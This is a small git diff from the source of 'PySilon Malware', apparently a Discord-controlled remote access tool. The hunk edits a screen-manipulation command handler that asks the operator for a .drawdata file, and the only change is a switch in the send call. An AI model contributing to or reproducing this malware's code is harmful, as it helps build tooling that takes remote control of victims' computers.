@@ -15,7 +15,7 @@ async def screen_manipulation(ctx, option=None):
     if option == 'graphic':
         embed = discord.Embed(title='📤 Provide a file containing graphic', description='Send your .drawdata file here', colour=discord.Colour.blue())
         embed.set_author(name='PySilon Malware', icon_url='https://raw.githubusercontent.com/mategol/PySilon-malware/py-dev/resources/icons/embed_icon.png')
-        await ctx.channel.send(embed=embed)
+        await ctx.send(embed=embed)
         def check(m):
             return m.attachments and m.channel == ctx.channel
 
